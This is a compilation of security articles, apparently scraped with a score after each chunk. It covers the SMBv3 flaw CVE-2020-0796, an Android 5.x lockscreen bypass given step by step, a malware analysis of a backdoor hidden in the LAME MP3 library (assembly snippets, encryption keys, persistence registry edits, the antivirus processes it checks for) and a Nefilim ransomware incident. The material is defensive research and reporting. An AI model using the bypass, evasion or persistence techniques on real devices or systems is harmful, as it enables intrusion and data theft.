SophosLabs Uncut Threat Research 2020-03 CVE-2020-0796 Exploit Patch Tuesday SMB SMBv3 updates Windows,0.008900894670288206
"Microsoft issues its latest set of cumulative updates for Windows and other Microsoft products this week, but the March, 2020 Patch Tuesday is notable not only because of the sheer volume of fixes, but because it will prevent one very serious bug in its Server Message Block (SMB) technology (download the patch right now) that could lead to a wide range of different (and potentially wormable) attacks.
The SMBv3 vulnerability fixed this month is a doozy: A potentially network-based attack that can bring down Windows servers and clients, or could allow an attacker to run code remotely simply by connecting to a Windows machine over the SMB network port of 445/tcp. The connection can happen in a variety of ways we describe below, some of which can be exploited without any user interaction; We’ve even developed our own proof-of-concept exploit (video below) to demonstrate how easy it could be for an attacker to take advantage of one of the scenarios. Microsoft has released some guidance notes about mitigating one attack scenario someone might use to exploit the vulnerability that involves adding a key to the Windows Registry.
Microsoft fixes 116 vulnerabilities with this month’s patches, and considers 25 of them critical, and 89 important. All the critical vulnerabilities could be used by an attacker to execute remote code and perform local privilege elevation. So far none of the vulnerabilities have been seen exploited in the wild, but they probably won’t stay that way forever.
At the same time, Adobe is fixing two important vulnerabilities in Adobe Reader.
Here is the list of products or components that receive updates today:",0.010407470276393882
"Windows internal components and services
Windows Defender
Windows Server IIS
Microsoft Office
Windows Mobile Device Management
Visual Studio
SharePoint
Web browsers: Edge and Internet Explorer
Azure DevOps
Microsoft Exchange",0.01012059614996752
"It’s worth reminding readers that the availability of patches does not mean that your computer has installed them, yet. To find and download this month’s Cumulative Update patch yourself, search for the term “2020-03” at the Microsoft Update Catalog website.
Let’s have a closer look at some of the more important vulnerabilities.
Windows SMBv3 Client/Server Remote Code Execution Vulnerability
CVE-2020-0796
This is the most important fix in this month patch release. This vulnerability is in version 3.1.1 of the SMB protocol, which is only present in 32- and 64-bit Windows 10 version 1903 and 1909 for desktops and servers.
The vulnerability involves an integer overflow and underflow in one of the kernel drivers. The attacker could craft a malicious packet to trigger the underflow and have an arbitrary read inside the kernel, or trigger the overflow and overwrite a pointer inside the kernel. The pointer is then used as destination to write data. Therefore, it is possible to get a write-what-where primitive in the kernel address space.
An attacker could use the vulnerability in a few different ways:",0.009465386867970493
"A network based attack can compromise any windows computer that has file sharing enabled, whether that machine is just a standard desktop or a more robust file server.
Social engineering or a person-in-the-middle attack that directs a Windows client to a malicious SMB server.
A privilege escalation attack that can let anyone obtain higher privileges than they normally should be allowed to have.",0.013771559628744101
"Scenario 1: An external attacker targets a machine sharing files
Difficulty level: complex
By default, the Windows Firewall blocks incoming connections on the SMB port when you’re connected to one of the networks you usually use that’s been added to the Public network category on your computer (that is, not on a corporate network where your computer has been joined to the domain). In that configuration, an attacker could not remotely attack the machine.
However, if the port has been manually opened, or if the firewall is disabled, or if the machine is part of a Windows Domain, the machine may be exposed to attack. On some corporate networks, when you join the domain it applies a policy to a third category in your firewall settings just for these kinds of networks. So joining a corporate domain automatically opens the SMB port, which then exposes that machine to the remote form of the attack, in which an attacker who develops or uses an exploit could gain full control of the machine.
It goes without saying that any unpatched system with the vulnerable SMB port open to the public internet could become a target of opportunity for a worm-like outbreak, similar to WannaCry. The mitigating factor is that it requires an attacker with a state-of-the-art exploit that could bypass all the security mitigation Microsoft has built in to Windows 10, and that the target has port 445/tcp open for incoming connections.
Microsoft’s guidance about this particular attack scenario is to create a new Registry key of DisableCompression under the path HKEY_Local_Machine\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters and to assign it a 32-bit DWORD value of 1. This action, Microsoft says, will block unauthenticated attackers from being able to exploit the vulnerability on a machine that faces the public internet and is hosting shared files.
Scenario 2: Target convinced to open a connection to an evil file sharing server
Difficulty level: complex
Another scenario would be for an attacker to create their own SMB server, and then convince a user to connect to their malicious server. This kind of attack might take the form of a spam email or instant message with a link to the evil SMB server hosting malicious code. If the attacker convinces the target to click the link — which could take the form of a Windows shortcut (a .lnk file), or just the name of a share (or a mapped drive) on a remote system — the evil server sends the attack packet back to your machine and immediately gains full control over it.
An example of how someone might use a malicious SMB link in an email message
The attacker could also do this by contriving a machine-in-the-middle attack (possibly by spoofing a machine or device that other computers connect to) that looks for the SMB request packet, and (again, assuming they have created or obtained a working exploit) returns the evil packet as a response. This type of attack might be employed by an attacker that is already inside the network and may use this method to gain control over a specific target machine.
While the second scenario does not require a special firewall configuration, the attacker still needs the same quality of exploit as in the first scenario, and they have to either perform a successful social engineering attack or have machine-in-the-middle position inside a network to inject the evil packet into the authentication response.
Scenario 3: An attacker, already inside, gives themselves SYSTEM privileges
Difficulty level: Hard
The last scenario uses the vulnerability to perform a local elevation of privilege. In this case, the attacker must have first compromised the machine by other means, for example, by falling victim to opening a malicious attachment.
At that point, the attacker has code execution in the context of the targeted user. If that user doesn’t have many privileges, the attacker would want to exploit the vulnerability to modify key components of the kernel to gain SYSTEM privilege, which lets the attacker do pretty much anything on the machine.
The exploit for the third scenario is less complex to develop but the attacker must first gain code execution on the targeted machine.
SophosLabs’ Offensive Research has developed a proof-of-concept exploit for this scenario. The video below demonstrates that we’re able to take a user who has limited privileges and launch a command shell with SYSTEM level privileges. This version runs in Windows 10 64-bit 1909 machine with all the security fixes installed from the previous month.",0.018610790410120592
"In any case, until an exploit is publicly available, don’t expect to see the kinds of opportunistic attacks right away. But you can’t just turn off SMB or block port 445/tcp and wash your hands of the matter. TCP port 445 is not only used by SMB, but by some other vital components of a Windows Domain. The only way to mitigate the vulnerability is to patch. So go patch!
Elevation of Privilege Vulnerabilities
CVE-2020-0690, CVE-2020-0770, CVE-2020-0773, CVE-2020-0788, CVE-2020-0791, CVE-2020-0860, CVE-2020-0877, CVE-2020-0887, CVE-2020-0898",0.009232010927040624
"The graphical subsystems of Windows, Win32k, DirectX, and GDI suffer from vulnerabilities that could allow an attacker to locally elevate their privilege to SYSTEM. The GDI bug could also be triggered remotely by sharing a document to the victim.
Internet Explorer and Edge Remote Code Execution Vulnerabilities
CVE-2020-0768, CVE-2020-0811, CVE-2020-0812, CVE-2020-0816, CVE-2020-0823, CVE-2020-0824, CVE-2020-0825, CVE-2020-0826, CVE-2020-0827, CVE-2020-0828, CVE-2020-0829, CVE-2020-0830, CVE-2020-0831, CVE-2020-0832, CVE-2020-0833, CVE-2020-0847, CVE-2020-0848
Internet Explorer and Edge were found to be vulnerable to a few Remote Code Execution vulnerabilities. Even though they would not result in a full system compromise, their successful exploitation would give an attacker a foothold onto a targeted computer, with associated privileges, allowing further lateral or vertical escalation.",0.009856084184369118
"Protection notes
Sophos has released following detection signatures to address the critical SMB vulnerability (CVE-2020-0796) in our network firewall IPS products. Please note that Sophos may release additional detections for these or other vulnerabilities in the future.",0.009865254266611667
"Signatures 2302022 and 2301958 are supported by all versions of the Sophos IPS products.
Signatures 2301960 and 2302002 have been also created for XG version 18 to provide generic detection coverage, leveraging more advanced capabilities in that platform.
Additional signatures
Sophos has also released the following IPS signatures to address the following vulnerabilities.",0.017415159191215945
"CVE
SID",0.008611871716647679
"CVE-2020-0833
2302035",0.00947748230355161
"CVE-2020-0847
2302036",0.009868311829369758
"CVE-2020-0824
90001080",0.009678936928820048
"CVE-2020-0832
90001081",0.009327680600825117
"How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. In many cases, existing detections will catch exploit attempts without the need for updates.
What if the vulnerability/0-day you’re looking for is not listed here?
If we haven’t released an update for a specific exploit, the most likely reason is that we did not receive the data that shows how the exploit works in the real world. As many of this month’s exploits were crafted in a lab and have not been seen in the wild, nobody has enough information (yet) about how criminals would, hypothetically, exploit any given vulnerability. If or when we receive information about real attacks, we will create new detections, as needed.",0.0103922475117596
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Researchers make easy work of Android lockscreen security
Researchers from the University of Texas at Austin have demonstrated how easy it is to bypass Android lockscreen security.",0.01619634961042138
Karl Thomas,0.008990830692124696
16 Sep 2015 - 11:40AM,0.011330553231270746
Researchers from the University of Texas at Austin have demonstrated how easy it is to bypass Android lockscreen security.,0.017596356013310666
"Security features on Android smartphones can easily be bypassed by cybercriminals, even if the device is protected by encryption, it has been revealed.",0.014831605698286565
"Researchers from the University of Texas at Austin discovered that as a result of the vulnerability in Android 5.x (CVE-2015-3860), attackers can circumvent Android lockscreen security and take control of the smartphone.",0.010428183478079056
"“By manipulating a sufficiently large string in the password field when the camera app is active an attacker is able to destabilize the lockscreen, causing it to crash to the home screen,” the team reported in an official blog.",0.009611094004977616
“At this point arbitrary applications can be run or adb developer access can be enabled to gain full access to the device and expose any data contained therein.”,0.01152358876896431
"There are two criteria for a successful attack to be launched. One, the cybercriminal must have physical access to the device and two, the original user must have a password set.",0.012023624368947439
The process of bypassing security,0.005651163356093947
"From the locked screen, the attacker will open the emergency call window, “type a few characters”, double-tap to highlight the text and then copy.",0.012468654702140536
"“[The cybercriminal will] then tap once into the field and tap paste, doubling the characters in the field,” the researchers elaborated.",0.014092513697242626
This process is then repeated until the attacker can no longer highlight the field with the double-tap (approximately 11 repetitions).,0.016162523849828636
"From this point, the cybercriminal will return to the lockscreen and then access the camera, which is possible without having full access to the smartphone.",0.012460168919533943
"The next step is to then swipe down to bring up the notification page, press the settings icon and then, in response to the password prompt, to long-tap into the field.",0.013568590602890285
"As with before, the process of repetitions begins again, with the attacker persisting with pasting the characters as many times as the device will allow.",0.009650287894434117
This comes to a halt when the user interface crashes and the “soft buttons of the screen disappear”. The camera will then expand to fullscreen and the attacker will wait until this function crashes (a degree of patience is required).,0.008543174766611261
"The attacker can then “navigate to the settings application by any means possible” and, “at this point, it is possible to enable USB debugging normally and access the device via the adb tool to issue arbitrary commands”.",0.008603424464361242
The vulnerability has been resolved,0.004572204450819517
"The security flaw was reported by the university to the Android security team towards the end of June. In August, it committed a patch to resolve the issue and on September 9th, announced that the 5.1.1 build LMY48M had fixed the issue.",0.011407172222687945
"In the announcement, Google stated that it had not observed any malicious activity of the kind highlighted by the University of Texas at Austin.",0.016732063570405797
Aggressive Android ransomware spreading in the US,0.009580137145447254
"In related news, ESET recently reported that it had found the “first known Android lock-screen-type ransomware spreading in the wild that sets the phone’s PIN lock”.",0.017856753245185653
"Lukas Stefanko, a malware researcher at ESET, noted that this development is significant and that “malware writers have stepped up their game”.",0.016614760685113472
"He explained: “With the new Android ransom-lockers … users have no effective way of regaining access to their device without root privileges or without some other form of security management solution installed, apart from a factory reset that would also delete all their data.”
",0.012840039161802985
"Needle in a haystack
2014-02-03",0.00928098121877674
"Gabor Szappanos
Sophos
,
Hungary
Editor:
Helen",0.00889288739339722
"Martin
Abstract
Sometimes what looks like a genuine MP3 encoder library, and even works as a functional encoder, actually hides malicious code deep amongst a pile of clean code. Gabor Szappanos reveals the lengths to which one piece of malware goes to hide its tracks.
Copyright © 2014 Virus Bulletin",0.011600363138649539
"Malware authors engaged in Advanced Persistent Threat (APT) operations put great effort into making sure their creations live up to their name and achieve persistence over the course of months or years; in order to do so, the threats must remain undetected by security products.
The authors try both to conceal the presence of the threats on infected systems and to hide their code from analysis and detection. Most crimeware authors achieve the latter by applying sophisticated execryptors and protectors to their code.
Over the past year, however, we have spotted a different approach: malicious code is compiled into an open source library, hidden among a large pile of clean library code, with only a single export pointing to the trojan functionality. The deployment and progression of this malware spans about two years now – however its versioning suggests that its development started longer ago than that.
This malware doesn’t take anything for granted: even common system tools like rundll32.exe and wscript.exe, which are present on all Windows systems, are carried with the installer and dropped when needed.
The malware goes to great lengths to cover its tracks. All of the string constants that could reveal the nature of the backdoor are protected with strong encryption. Additionally, the backdoor itself is disguised as a legitimate MP3 encoder library. In fact, it is a legitimate and functional MP3 library – and a bit more besides.",0.013868566574956498
"Exploited carrier workbook
In a handful of cases we have been able to identify the original exploited document that leads to the system infection. At the time of finalizing this paper, three exploited workbooks have been found that install this threat.
All of them are protected Excel workbooks with the default password (for more details see [1]). In short: the workbooks are password protected (that is, checked before opening). It is possible to leave the password field blank – in which case Excel encrypts the content using the default password: ‘VelvetSweatshop’. On the other hand, if a workbook is protected with exactly this password, Excel assumes that there is no password, and opens the document transparently. As a result, the document content is encrypted and hidden from normal analysis, but opening it will execute the shellcode without further prompting.
The workbooks exploit the CVE-2012-0158 vulnerability, which triggers the execution of shellcode within the document.
After the workbooks are opened, the intended operation is to open a decoy workbook – a clean file that grabs the attention of the user while malicious activities proceed in the background. The themes of the decoys give us some idea as to the areas of interest of the target audience of this malware distribution.",0.014275299253911689
"Workbook 1
Filename: 300.xls (rough translation: ‘300 petitioners cosigned.xls’)
File size: 839756 bytes
SHA1: 066998e20ad44bc5f1ca075a3fb33f1619dd6313
MD5: 5c370923119f66e64a5f9accdd3d5fb
This does not display any decoy document, just closes the Excel window. Nevertheless, the shellcode execution proceeds.
If the file was opened, it would display a workbook with a list of names, gender, region and phone numbers of Chinese individuals.
Figure 1. Decoy content for 066998e20ad44bc5f1ca075a3fb33f1619dd6313.",0.011377024212624098
"Workbook 2
Filename: sample.xls
File size: 638912 bytes
SHA1: e5e183e074d26416d7e6adfb14a80fce6d9b15c2
MD5: 2066462274ed6f6a22d8275bd5b1da2b
Figure 2. Decoy content for e5e183e074d26416d7e6adfb14a80fce6d9b15c2.",0.014377056222622198
"Workbook 3
Filename: LIST OF KEY OFFICIALS IN THE DND PROPER.xls
File size: 638912 bytes
SHA1: d80b527df018ff46d5d93c44a2a276c03cd43928
MD5: 80857a5541b5804895724c5d42abd48f
This decoy workbook contains information about key officials in the Philippines Department of National Defense (DND).
Figure 3. Decoy content for d80b527df018ff46d5d93c44a2a276c03cd43928.
In the rest of this article, unless specified otherwise, we refer to the operation resulting from infection via Workbook 1 – but the overall operations (dropped filenames, registry keys, backdoor functions) are the same in each case.
When mining our sample collection for related samples we were able to spot other examples – however, in these instances the initial dropper was not available for our analysis, only the temporary dropper executables or the final payloads could be located. In these cases we don’t have complete information about the system infection, but it is safe to assume that similar exploitation schemes were utilized.",0.011792422110437295
"Shellcode
The shellcode features an interesting anti-debugging trick that I have come across quite regularly in APT samples lately. Most of the Windows API functions are resolved and called normally, but some of the critical ones (such as WinExec and CreateFile) are not entered at the entry address (as stored in the kernel32.dll export table), but five bytes after it instead. These functions are responsible for the most critical operations of the code (dropping the payload executable and executing it), which would reveal unusual activity in the scope of an ordinary Excel process.
As most tracers and debuggers would place the breakpoint or hijack function right at the entry of the API function, skipping the first few bytes is a good way to avoid API tracing and debugging.
Figure 4. Anti-tracing trick.
(Click here to view a larger version of Figure 4.)
The same happens with WriteFile and GlobalAlloc, but this time, depending on whether or not there is a call right at the entry of the function, the displacement will be either five or seven bytes.
Figure 5. Anti-tracing hook initialization.
As a result of the functions not being entered at their usual entry points, the first few instructions are missed. As these are still essential for the stack management, the code is compensated within the shellcode, where a standard function prologue (stack frame creation push ebp, move ebp,esp) is executed.
For system functions compiled with standard compilers, the first few instructions are fixed on the entry point, but anything after that can’t be taken for granted. The shellcode can’t enter further than five or seven bytes into the API function, otherwise it could end up in the middle of a multi byte instruction, easily crashing the application.
Figure 6. Anti-tracing used in practice.
In order to extract the embedded executable, the shellcode needs to find the carrier workbook. It does this using the fact that, at the time of the exploitation, the workbook must remain open in Excel. The code enumerates all possible handles and tries to call GetFileSize on each of them. If the function fails, because the handle does not belong to an open file (it could belong to many other objects such as directory, thread, event or registry key), or the file size is smaller than the expected size of the workbook (minus the appended encrypted EXE), 1de10h bytes, it skips to the next handle value.
Next, it reads four bytes from offset 0x1de00; the value found there should be equal to the size of the carrier workbook (this time including the appended EXE).
At this position, in the appended content following the OLE2 document structure, a short header is stored that contains the full carrier workbook size, the embedded EXE size and the embedded decoy workbook size. These values are used by the shellcode. The encrypted EXE content follows.
Organizing the code and structure in this manner makes the carrier/dropper workbook component and the dropped payload executable completely independent – it is possible to replace the payload with a new variant without changing a bit in the carrier encrypted workbook.
Figure 7. Appended header and payload.
Once the hosting workbook is found, the code proceeds with decoding the embedded executable (using a one byte XOR algorithm with running key plus an additional one byte XOR with a fixed key), saving it to a file named ‘Winword.exe’ in the %TEMP% directory, then executing it. At this point, the decoy workbook content is dropped (using the same algorithm: one byte XOR with running key plus one byte XOR with fixed key, only this key differs from the one used in decoding the EXE).",0.01910697074560086
"Temporary dropper
This file is the dropper and installer for the final payload. It has an initial anti-debug layer.
The address of the GetVersion function is patched in the import table, to contain an internal function virtual address instead of an imported function address, which is normally expected at that position. The code around the entry point uses the stored value to redirect execution:
mov  large fs:0, esp
sub  esp, 58h
push ebx
push esi
push edi
mov  [ebp-18h], esp
call ds:dword_41A188",0.010388564330732097
"The execution actually goes to the address stored at dword_41A188, which is the memory location 00402440.
The program has only one export, LoadLibrary, thus when the operating system loads the program and resolves the external dependencies, this value, stored within the import table region, remains intact. The trick completely fools IDA Pro, which can’t be convinced that the location is an internal position and not an external import. This makes static analysis a bit more complicated. The necessary imported function addresses are later resolved dynamically by the initialization code of the dropper.
The major procedures of the dropper program are not called directly; instead, the trojan builds a function pointer table, and calls to procedures are performed via indexing into this table, as shown in Figure 8.
Figure 8. Building the function pointer table.
The key procedures are identified by having the following instruction sequence near the prologue:
push ebp
mov  ebp, esp
push eax
mov  eax, 12547908h
pop  eax",0.01826172898884404
"The value stored in the EAX register is a combination of two elements: 1254 is the marker; 7908 is the numeric ID for the function.
The entry is located by searching backwards for the standard prologue:
push ebp
mov  ebp, esp",0.014667695997410912
"The procedures are later invoked by calling indexes from the function pointer table (see Figure 9).
Figure 9. Using the function pointer table.
Winword.exe normally drops three major components into the system:
%PROGRAM FILES%\Common Files\ODBC\AppMgmt.dll – the final payload (Windows DLL file)
%PROGRAM FILES%\Common Files\DBEngin.EXE – a copy of rundll32.exe (a clean Windows system file, used for executing the payload)
%PROGRAM FILES%\Common Files\WUAUCTL.EXE – another rundll32.exe (a clean Windows system file, used for executing the payload).
Additionally, two registry export files named jus*.tmp (with a random number added after jus) are dropped into %TEMP%. These are the old and new hives of the HKLM\SYSTEM\CurrentControlSet\Services\AppMgmt registry location – a location at which the trojan registers itself in order to execute automatically upon each system boot. Saving the hives to a file makes it possible to modify the registry in one shot using RegRestoreKey.
Also dropped is a 301,445 byte long jus*.tmp file, which is a CAB archive containing the payload DLL.
The execution flow takes a different route if the presence of running security products is detected. The following process names are checked: KVMonXP.exe, RavMonD.exe, RsTray.exe, ccsvchst.exe, QQPCTray.exe, zhudongfangyu.exe, 360sd.exe, 360Tray.exe, zatray.exe, bdagent.exe, ksafetray.exe, kxetray.exe and avp.exe. However, not all of the security processes are checked at the same time – only a couple of selected ones are checked before each major operation.
As an example, if zatray.exe, RsTray.exe or RavMonD.exe is running, then AppMgmt.dll is not dropped and instead, the 400MB vbstdcomm.nls is created (the large size is due to an enormous amount of junk appended at the end of the file). Finally, a VBScript file is created and executed with the help of a dropped copy of wscript.exe (both files are saved to the %TEMP% folder, as lgt*.tmp.vbs and lgt*.tmp.exe, respectively). An encrypted copy of Winword.exe is created in %CommonProgramFiles%\ODBC\odbc.txt, using a one byte XOR algorithm with key 0xCC. Vbstdcomm.nls, which serves as a backup installer, takes the encrypted copy of Winword.exe, decodes it and simply executes.
The dropper registers AppMgmt.dll as a service. This is not achieved by creating a new service entry, rather by taking over the role of an already installed service, AppMgmt, redirecting the service DLL from the clean library to the dropped malware payload:
HKLM\SYSTEM\CurrentControlSet\Services\AppMgmt\Parameters: ServiceDll
%SystemRoot%\System32\appmgmts.dll -> C:\Program Files\Common Files\ODBC\AppMgmt.dll
In addition, the start up mode is changed from auto to demand in the location:
HKLM\SYSTEM\CurrentControlSet\Services\AppMgmt: Start
Then it changes the error control settings in the registry key HKLM\SYSTEM\CurrentControlSet\Services\AppMgmt:ErrorControl from normal (this would mean that if the driver fails to load, the start up process proceeds, but a warning is displayed) to ignore (in this case if the driver fails to load, start up proceeds, and no warning is displayed). The change is designed to avoid raising suspicion, should start up fail for any reason.
Finally, it executes the dropped DLL by executing net start AppMgmt.",0.01827393339674155
"Payload
We have identified five different versions of the final payload. Two of them were replicated from the exploited workbooks detailed earlier; the other three were found when we were digging through our sample collection searching for samples with similar characteristics.
The main characteristics of the five variants are summarized in Table 1 shown below (detailed descriptions of the columns are provided later in this section).
(Click here to view a larger version of Table 1.)
This DLL is built from the LAME MP3 encoder source [2]. The full library has been compiled, and in addition, a couple of malicious exports have been added to the code: lame_set_out_sample and lame_get_out_sample.
Figure 10. Additional malicious imports.
Note that the names of the additional exports are strikingly similar to the legitimate exports, lame_set_out_samplerate and lame_get_out_samplerate, which are present in the LAME source – thus it is not very obvious that the additional exports belong to something completely different.
One of the extra exports, lame_get_out_sample, is missing from newer versions of the malware. However, the function that would invoke this export is still present in the code. Clearly, the code was not cleaned up properly when the export was removed.
The backdoor contains many encrypted strings, one of which serves as an internal version number. In Table 1 we list the version numbers as they appear in the code. Collected information suggests that the most widely distributed was version 2.3(UDP), making its rounds in the wild in early December 2012.
Table 1 also lists the date when we first saw each particular backdoor variant – either arriving in our collection, reported in cloud look ups or seen elsewhere on the Internet. Additionally, the compilation date is listed, as taken from the PE header.
An interesting quirk comes from the usage of the LAME source: one of the original source functions, beVersion(), inserts the compilation date into the data section of the executable.
Figure 11. Compilation date in code.
This provides an independent method of determining the creation date of the variant aside from the PE time stamp. There was no trick, however – the two dates matched in all cases.
It is notable that there is always a large gap between the compilation date and the date of the first observation of each variant. There are several possible reasons for this:
Small-scale targeted attacks don’t provide much telemetry information; the smaller the number of targets, the slimmer our chances of finding out about their infection.
The trojan looks very similar to a real LAME encoder library; infected victims are reluctant to submit it for analysis.
There may be an intentional delay (some sort of testing period) in the release process of the malware.
The backdoor uses different approaches for handling C&C communication. Earlier versions used the standard Windows socket communication functions (send, recv) to exchange data with the C&C server. The newer versions linked the UDT data transfer library (available from udt.sourceforge.net) for communication. The versioning of the variants suggests that some time around March 2012, the code forked into a socket communication branch (TCP) and a UDT powered communication branch (UDP).
The backdoor features all the basic functionality that is expected from a piece of malware of its class. It is able to:
Create screenshots
Get drive type (FAT, FAT32, NTFS, CDFS) and free space
Enumerate files and directories and send the list to the server
Rename files
Create directories
Delete files.
The last character of the ModuleFileName (without extension) is checked on execution: if it is not of one of the expected values – ‘T’, ‘t’ (executed via net.exe), ‘R’, ‘r’, ‘N’, ‘n’ (executed via DBEngin.EXE), ‘2’ (rundll32.exe), ‘L’ or ‘l’ – it builds and injects a simple piece of code to load AppMgmt.dll properly.
For this purpose, it creates a new suspended process (with command line: c:\windows\system32\svchost.exe), calls GetThreadContext on it, and gets EAX from the CONTEXT structure, using the fact that in the case of a suspended process the EAX register always points to the entry point of the process. Then it writes the starter code to this entry point and resumes the thread. The suspended thread is not visible in the process list at that point. This way, the trojan can escape analysis, if not executed in a natural form, and still execute.
Configuration data is stored in a file named DbTrans.db, XOR encrypted with key 0x58.
The string constants (API names, DLL names, process names) are all stored in encrypted form using a strong encryption algorithm. The strings are stored aligned (Unicode strings to 0x90 bytes, ASCII strings to 0x38 bytes boundary), decrypted in eight byte chunks using the DES ECB algorithm, and referenced by IDs that index into this name pool. The encrypted strings contain padding bytes at the end, where zeros are encoded.
The strings are decrypted on the fly before being used and filled with zeros after use. This way there are no visible strings in the memory that would give away more information about the internals of the backdoor.
There are three nearly identical encryption functions (and accompanying encrypted string tables and encryption keys) in all variants: one is for the Unicode strings, one for the ordinary ASCII constants, and a third one for the Windows API function names (also stored as ASCII strings) that are used in the code. We found that only the encryption keys were different for the three cases. The following key seeds remain the same throughout the variants:
For ASCII strings: 82 C5 D3 59 2B 38 00 00
For Unicode strings: 5E 97 CC 42 8E CD 00 00
For API function names: 5B 5F CB 8D E5 F5 00 00
In the last version, the two ASCII functions are merged into a single function.
The C&C addresses are hard coded into the backdoor, and protected with a simple byte wise XOR (key:0x58) encryption. This is an interesting choice, given that all other string constants are protected with a string DES algorithm – perhaps the server addresses are changed more frequently (indeed, there is a minimal overlap between the different versions’ C&C addresses) than the authors are comfortable with re-encrypting the strings – but no evidence was found for it in the few samples we have found.
The string constants of the code are referenced by IDs and decrypted on the fly. However, there are strings that are never used in the code. These could belong to an earlier or internal version, and simply have not been cleaned up from the string pool, as illustrated in this example:
push 9   ; ,lame_set_out_sample
call Get_String_A
push 0Ah ; ,
call Get_String_A
push 1Eh ; DBEngin.exe
call Get_String_A
push 8   ; EXPL.EXE
pop  eax
call Get_String_W
push offset s_expl_exe
push [ebp+var_254]
call StrCpyW
push 8
pop  eax
xor  ecx, ecx
call set_mem
push ebx
push 2
call CreateToolhelp32Snapshot",0.019615921475955256
"Some of these strings could be internal configuration options for the development environment (I suspect these are access details to an internal server):
kazafei
192.168.1.98
80",0.007277665020364421
"Other strings provide status information about the current operation of the backdoor:
Client RecvData Complete
A File Search Task has start already !!!
File Search Task Success
File Search Task Failed, Please Check
Upload Client Failed
Upload Client Success
Delete File Success
Delete File Failed
Rename File Success
Rename File Failed
Create Folder Success
Create Folder Failed",0.01461623660068212
"A few constants indicate undocumented or debug functionality:
X:\Windows\System32\rundll32.exe
X:\Windows\msacm32.drv
MagicMutex
D:\Resume.dll
D:\delete.dll
D:\delete2.dll",0.010660771503926525
"Conclusion
When looking into APT attack scenarios, one has to be extra careful. Often we see that clean programs and libraries are dropped onto systems to hide the operation of malicious applications [3]. But sometimes, what looks to be a genuine MP3 encoder library, and even works as a functional encoder, actually hides malicious additions buried deep in a large pile of clean code. One has to be very thorough when it comes to targeted attacks, and one cannot afford to make any assumptions.",0.014271461976917088
"Bibliography
[1] Baccas, P. When is a password not a password? When Excel sees “VelvetSweatshop”. http://nakedsecurity.sophos.com/2013/04/11/password-excel-velvet-sweatshop/.
[2] LAME (Lame Aint an MP3 Encoder). http://sourceforge.net/projects/lame/.
[3] Szappanos, G. Targeted malware attack piggybacks on Nvidia digital signature. http://nakedsecurity.sophos.com/2013/02/27/targeted-attack-nvidia-digital-signature/.
",0.011743898700564248
Nefilim Ransomware Attack Uses “Ghost” Credentials,0.009879971497637863
"Written by
Michael Heller",0.008758043479553224
"January 26, 2021",0.010767205451704287
Security Operations access management credential theft MTR nefilim Ransomware Rapid Response Sophos Managed Threat Response (MTR),0.016936357892943565
"Keeping close tabs on the account credentials in your organization should always be a top priority, as a Sophos Rapid Response customer recently learned. Sophos Rapid Response is a 24/7 service that helps organizations to quickly identify and neutralize active threats.
The company reached out to Rapid Response to get help with a Nefilim (also known as Nemty) ransomware attack in which more than 100 systems were impacted. Sophos’ Intercept X endpoint protection has no problem detecting and stopping Nefilim. Unfortunately, the customer did not have this protection in place. Nefilim ransomware, like virtually all major ransomware, replaces the original files with encrypted versions, making recovery impossible without either the decryption key or a recent backup.
The Rapid Response team sprang into action as soon as they were contracted by the customer, loading Sophos security onto all the systems it could access, ensuring all necessary protections were turned on for systems that already had Sophos installed, and digging for clues as to how and when the intrusion began and what might have been stolen.
By the time of Sophos’ standard “kick-off” call to describe the process of the Rapid Response team and gather context around the evidence uncovered so far, the team had already singled out user accounts that had been taken over and compiled a general timeline of the attack.
The team determined the attacker had compromised an admin account with high level access about one month before launching Nefilim ransomware. Or more accurately, the attacker gained access to that admin account, then spent one month quietly moving around to steal credentials for a domain admin account, finding the trove of data they wanted, exfiltrating hundreds of GB of data, and then finally announcing their presence with the ransomware attack.
“Ransomware is the final payload in a longer attack. It is the attacker telling you they already have control of your network and have finished the bulk of the attack. It is the attacker declaring victory,” Peter Mackenzie, manager for Rapid Response, said. “Identifying you are under a ransomware attack is easy, identifying the attacker was on your network a week earlier is what counts.”
Based on Sophos intelligence, the Rapid Response team knew the threat actors behind Nefilim ransomware commonly gain initial access either by exploiting vulnerable versions of Citrix or Remote Desktop Protocol. In this case, the adversary exploited vulnerable Citrix software, gained access to the admin account, then stole the credentials for a domain admin account using Mimikatz.
During Sophos’ initial kick-off call, the Rapid Response team relayed which admin account had been compromised in the initial intrusion, and asked the customer: Whose account was it? The answer: the account belonged to an individual who had sadly passed away around three months before the attacker’s first move.
Apparently, the account was kept active because there were services that it was used for, meaning the Rapid Response team had to discern which activities from that account were legitimate and which were malicious.
“The malicious activities were often in the middle of the night for the customer’s local time,” Mackenzie said. “We were able to work out some of the movements in the account based on when they occurred and when the commands were being performed.”
If an organization really needs an account after someone has left the company, they should implement a service account and deny interactive logins to prevent any unwanted activity. Or, if they don’t need the account for anything else, disable it and carry out regular audits of Active Directory. Active Directory Audit Policies can be set to monitor for admin account activity or if an account is added to the domain admin group.
Mackenzie noted far fewer accounts need to be a domain admin than most people think.
“People assume because a person is an executive or is in charge of the network that they need to be using a domain admin account. ​This isn’t true and it’s dangerous,” Mackenzie said. “No account with privileges should be used by default for work that doesn’t require that level of access. Users should elevate to using the required accounts when needed and only for that task.”
Mackenzie added that alerts should be set so that if the domain admin account is used or if a new admin account is created, someone knows. A previous case that Rapid Response was called in on proved this point.
In this particular case, an attacker gained access to an organization’s network, created a new user, and added that account to the domain admin group in Active Directory. No alerts were set off, so that new domain admin account went on to delete about 150 virtual servers and used Microsoft BitLocker to encrypt the server backups.
Mackenzie told the customer they were lucky the attack was so visibly destructive and easily noticed.
“If they hadn’t done that, how long would they have had domain admin access to the network without the customer knowing?”
Detection and IoCs
Nefilim ransomware is detected in Sophos Endpoint Protection under the definition Troj/Ransom-GDN.
Additional indicators of compromise have been published to the SophosLabs Github.
Nefilim group Tactics, Techniques, and Procedures (TTPs)
The common Tactics, Techniques and Procedures (TTPs) of the group(s) that operate Nefilim ransomware have often utilized Citrix vulnerabilities or Remote Desktop Protocol (RDP) to gain initial entry into victim environments by exploiting public facing applications MITRE ATT&CK T1190.
